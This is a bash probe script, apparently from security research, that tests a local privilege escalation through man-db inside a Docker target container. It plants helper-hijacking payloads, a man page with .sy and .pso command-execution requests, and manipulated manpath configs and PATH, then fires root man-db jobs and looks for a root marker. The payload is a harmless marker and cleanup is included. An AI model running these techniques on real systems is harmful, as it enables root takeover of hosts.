#!/usr/bin/env bash
set -Eeuo pipefail

container="${1:-ubuntu24-server-lpe-target}"

docker exec -i "$container" bash -s <<'TARGET'
set -Eeuo pipefail

WORK=/tmp/man_db_cache_probe
ROOT_MARKER=/root/man_db_cache_probe_root_marker
USER_MAN=/home/attacker/.local/share/man/man1/man_db_cache_probe.1
USER_CACHE=/home/attacker/.cache/man_db_cache_probe

section() {
  printf '\n### %s\n' "$1"
}

attempt_root() {
  printf '+ root# %s\n' "$*"
  set +e
  bash -lc "$*" 2>&1
  rc=$?
  set -e
  printf '[rc=%s]\n' "$rc"
}

attempt_attacker() {
  printf '+ attacker$ %s\n' "$*"
  set +e
  runuser -u attacker -- bash -lc "$*" 2>&1
  rc=$?
  set -e
  printf '[rc=%s]\n' "$rc"
}

cleanup_probe() {
  rm -rf "$WORK" /var/tmp/man_db_cache_probe "$ROOT_MARKER" \
    /root/man_db_cache_probe_* /root/man_db_cache_probe_symlink_target \
    "$USER_MAN" "$USER_CACHE" /home/attacker/.cache/man_db_cache_probe_rootmap \
    /home/attacker/man_db_cache_probe 2>/dev/null || true
  find /home/attacker/.local/share/man -type d -empty -delete 2>/dev/null || true
  systemctl reset-failed man-db.service >/dev/null 2>&1 || true
}

cleanup_probe

section "default package and service proof"
cat /etc/os-release
uname -a
dpkg-query -W man-db groff-base cron cron-daemon-common 2>/dev/null || true
printf 'attacker_identity='
id attacker
printf 'system_state_before='
systemctl is-system-running || true
printf 'failed_units_before='
systemctl --failed --no-legend | wc -l
systemctl list-unit-files man-db.service man-db.timer cron.service --no-legend || true
systemctl --type=service,timer --state=running,active --no-legend | grep -E 'man-db|cron' || true

section "default code and config lines"
nl -ba /usr/lib/systemd/system/man-db.service
nl -ba /usr/lib/systemd/system/man-db.timer
nl -ba /etc/cron.daily/man-db
nl -ba /etc/cron.weekly/man-db
nl -ba /usr/lib/tmpfiles.d/man-db.conf
nl -ba /etc/manpath.config | sed -n '20,72p'

section "default permissions"
ls -l /usr/bin/mandb /usr/bin/catman /usr/bin/groff /usr/bin/troff /usr/bin/tbl \
  /usr/bin/eqn /usr/bin/pic /usr/bin/preconv /usr/bin/soelim /usr/bin/man 2>/dev/null || true
getcap /usr/bin/mandb /usr/bin/catman /usr/bin/groff /usr/bin/troff /usr/bin/tbl \
  /usr/bin/eqn /usr/bin/pic /usr/bin/preconv /usr/bin/soelim /usr/bin/man 2>/dev/null || true
ls -ld /etc/manpath.config /etc/groff /usr/share/groff /usr/share/man /usr/local/man \
  /usr/local/share/man /var/cache/man /tmp /var/tmp 2>/dev/null || true
find /var/cache/man -maxdepth 1 -xdev -ls | sort | sed -n '1,80p'

section "attacker-controlled man page, config, payloads"
runuser -u attacker -- bash <<'ATTACKER_SETUP'
set -Eeuo pipefail
WORK=/tmp/man_db_cache_probe
USER_MAN="$HOME/.local/share/man/man1/man_db_cache_probe.1"
USER_CACHE="$HOME/.cache/man_db_cache_probe"
rm -rf "$WORK" "$USER_CACHE" "$HOME/.cache/man_db_cache_probe_rootmap" "$USER_MAN"
mkdir -p "$WORK/bin" "$WORK/hits" "$USER_CACHE" "$(dirname "$USER_MAN")"

cat > "$WORK/bin/payload" <<'PAYLOAD'
#!/bin/sh
name=$(basename "$0")
mkdir -p /tmp/man_db_cache_probe/hits 2>/dev/null || true
{
  printf 'helper=%s\n' "$name"
  id
  printf 'argv='
  for arg in "$@"; do printf ' <%s>' "$arg"; done
  printf '\n'
  env | grep -E '^(PATH|MANPATH|MANROFFOPT|PAGER|MANPAGER|LESSOPEN|HOME|USER)=' || true
  printf -- '---\n'
} >> "/tmp/man_db_cache_probe/hits/${name}.$$" 2>/dev/null || true
if [ "$(id -u)" = 0 ]; then
  {
    printf 'ROOT PAYLOAD HIT helper=%s\n' "$name"
    id
    printf 'argv='
    for arg in "$@"; do printf ' <%s>' "$arg"; done
    printf '\n'
  } >> /root/man_db_cache_probe_root_marker 2>/dev/null || true
fi
case "$name" in
  gzip) exec /bin/gzip "$@" ;;
  col) exec /usr/bin/col "$@" ;;
  less|pager|lessopen) cat >/dev/null; exit 0 ;;
  *) cat; exit 0 ;;
esac
PAYLOAD
chmod 755 "$WORK/bin/payload"
for helper in groff nroff troff tbl eqn neqn pic refer preconv soelim col gzip pager less lessopen zsoelim manconv; do
  ln -sf payload "$WORK/bin/$helper"
done

cat > "$USER_MAN" <<'MANPAGE'
'\" t
.TH MAN_DB_CACHE_PROBE 1
.SH NAME
man_db_cache_probe \- cache builder trust-boundary probe
.SH DESCRIPTION
.TS
box;
c.
probe
.TE
.EQ
x=y
.EN
.PS
box
.PE
.pso /tmp/man_db_cache_probe/bin/payload pso_request
.sy /tmp/man_db_cache_probe/bin/payload sy_request
MANPAGE

cat > "$WORK/include.roff" <<'INC'
.SH INCLUDED
included file from attacker tmp
INC

cat > "$WORK/manpath.config" <<'CFG'
MANDATORY_MANPATH /home/attacker/.local/share/man
MANDB_MAP /home/attacker/.local/share/man /home/attacker/.cache/man_db_cache_probe
DEFINE troff troff
DEFINE nroff nroff
DEFINE eqn eqn
DEFINE neqn neqn
DEFINE tbl tbl
DEFINE pic pic
DEFINE refer refer
DEFINE grap grap
DEFINE preconv preconv
DEFINE soelim soelim
DEFINE col col
DEFINE compressor gzip -c7
SECTION 1
CFG

cat > "$WORK/manpath-rootcache.config" <<'CFG'
MANDATORY_MANPATH /home/attacker/.local/share/man
MANDB_MAP /home/attacker/.local/share/man /var/cache/man/man_db_cache_probe
DEFINE troff troff
DEFINE nroff nroff
DEFINE eqn eqn
DEFINE neqn neqn
DEFINE tbl tbl
DEFINE pic pic
DEFINE refer refer
DEFINE preconv preconv
DEFINE soelim soelim
DEFINE col col
DEFINE compressor gzip -c7
SECTION 1
CFG

ln -sfn /root/man_db_cache_probe_symlink_target "$WORK/root-symlink"
ATTACKER_SETUP
find "$WORK" -maxdepth 3 -ls | sort
ls -l "$USER_MAN" "$WORK"/manpath*.config

section "attacker write and trigger attempts"
attempt_attacker 'id; groups'
attempt_attacker 'for p in /etc/manpath.config /etc/groff /usr/share/groff /usr/share/man /usr/local/share/man /var/cache/man /var/cache/man/local /usr/lib/systemd/system/man-db.service /etc/cron.daily/man-db; do if [ -e "$p" ]; then [ -w "$p" ] && echo "WRITABLE $p" || echo "not_writable $p"; else parent=$(dirname "$p"); [ -w "$parent" ] && echo "parent_writable_missing $p" || echo "missing_not_creatable $p"; fi; done'
attempt_attacker 'touch /var/cache/man/man_db_cache_probe_touch'
attempt_attacker 'mkdir /usr/local/share/man/man_db_cache_probe_dir'
attempt_attacker 'ln -s /root/man_db_cache_probe_symlink_target /var/cache/man/man_db_cache_probe_link'
attempt_attacker 'PATH=/tmp/man_db_cache_probe/bin:$PATH MANPATH=$HOME/.local/share/man MANROFFOPT=-U PAGER=/tmp/man_db_cache_probe/bin/pager LESSOPEN="|/tmp/man_db_cache_probe/bin/lessopen %s" mandb -C /tmp/man_db_cache_probe/manpath.config --user-db -d "$HOME/.local/share/man" >/tmp/man_db_cache_probe/mandb-user.out 2>&1; rc=$?; echo "mandb_user_rc=$rc"; tail -80 /tmp/man_db_cache_probe/mandb-user.out; exit 0'
attempt_attacker 'PATH=/tmp/man_db_cache_probe/bin:$PATH MANPATH=$HOME/.local/share/man MANROFFOPT=-U PAGER=/tmp/man_db_cache_probe/bin/pager LESSOPEN="|/tmp/man_db_cache_probe/bin/lessopen %s" catman -C /tmp/man_db_cache_probe/manpath.config -M "$HOME/.local/share/man" >/tmp/man_db_cache_probe/catman-user.out 2>&1; rc=$?; echo "catman_user_rc=$rc"; tail -80 /tmp/man_db_cache_probe/catman-user.out; exit 0'
attempt_attacker 'PATH=/tmp/man_db_cache_probe/bin:$PATH MANROFFOPT=-U /usr/bin/groff -U -t -e -p -mandoc "$HOME/.local/share/man/man1/man_db_cache_probe.1" >/tmp/man_db_cache_probe/groff-user.out 2>&1; rc=$?; echo "groff_user_rc=$rc"; tail -80 /tmp/man_db_cache_probe/groff-user.out; exit 0'
attempt_attacker 'PATH=/tmp/man_db_cache_probe/bin:$PATH MANPATH=$HOME/.local/share/man MANROFFOPT=-U mandb -C /tmp/man_db_cache_probe/manpath-rootcache.config "$HOME/.local/share/man" >/tmp/man_db_cache_probe/mandb-rootcache.out 2>&1; rc=$?; echo "mandb_rootcache_rc=$rc"; tail -80 /tmp/man_db_cache_probe/mandb-rootcache.out; exit 0'
attempt_attacker 'PATH=/tmp/man_db_cache_probe/bin:$PATH MANROFFOPT=-U PAGER=/tmp/man_db_cache_probe/bin/pager LESSOPEN="|/tmp/man_db_cache_probe/bin/lessopen %s" /usr/bin/man -l "$HOME/.local/share/man/man1/man_db_cache_probe.1" >/tmp/man_db_cache_probe/man-stub.out 2>&1; rc=$?; echo "man_stub_rc=$rc"; cat /tmp/man_db_cache_probe/man-stub.out; exit 0'
attempt_attacker 'systemctl set-environment PATH=/tmp/man_db_cache_probe/bin:$PATH MANPATH=$HOME/.local/share/man MANROFFOPT=-U PAGER=/tmp/man_db_cache_probe/bin/pager'
attempt_attacker 'systemctl start man-db.service'
attempt_attacker 'systemd-run --unit=man-db-cache-probe /usr/bin/id'

section "attacker-controlled helper hits before root service"
find "$WORK/hits" -type f -maxdepth 1 -print -exec sed -n '1,12p' {} \; | sort || true

section "root default timer/service and cron simulation after attacker setup"
attempt_root 'systemctl reset-failed man-db.service; systemctl start man-db.service; systemctl status --no-pager -l man-db.service | sed -n "1,80p"'
attempt_root 'env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin SHELL=/bin/sh HOME=/root /etc/cron.daily/man-db'
attempt_root 'env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin SHELL=/bin/sh HOME=/root /etc/cron.weekly/man-db'
attempt_root 'systemd-tmpfiles --create /usr/lib/tmpfiles.d/man-db.conf; ls -ld /var/cache/man'

section "root marker and post-trigger cache state"
root_hit=0
if [ -e "$ROOT_MARKER" ]; then
  root_hit=1
  echo "ROOT_PAYLOAD_MARKER_PRESENT"
  cat "$ROOT_MARKER"
else
  echo "NO_ROOT_PAYLOAD_MARKER"
fi
find "$WORK/hits" -type f -maxdepth 1 -print -exec sed -n '1,12p' {} \; | sort || true
find /var/cache/man -maxdepth 2 -xdev \( -name '*man_db_cache_probe*' -o -name '*probe*' \) -ls 2>/dev/null || true
ls -ld /var/cache/man /var/cache/man/local 2>/dev/null || true

section "cleanup"
cleanup_probe
printf 'system_state_after='
systemctl is-system-running || true
printf 'failed_units_after='
systemctl --failed --no-legend | wc -l
leftovers=$(find /tmp /var/tmp /root /home/attacker -maxdepth 4 \( -name '*man_db_cache_probe*' -o -name 'man-db-cache-probe*' \) -print 2>/dev/null | sort || true)
if [ -n "$leftovers" ]; then
  echo "LEFTOVERS_PRESENT"
  printf '%s\n' "$leftovers"
else
  echo "NO_PROBE_LEFTOVERS"
fi

exit "$root_hit"
TARGET
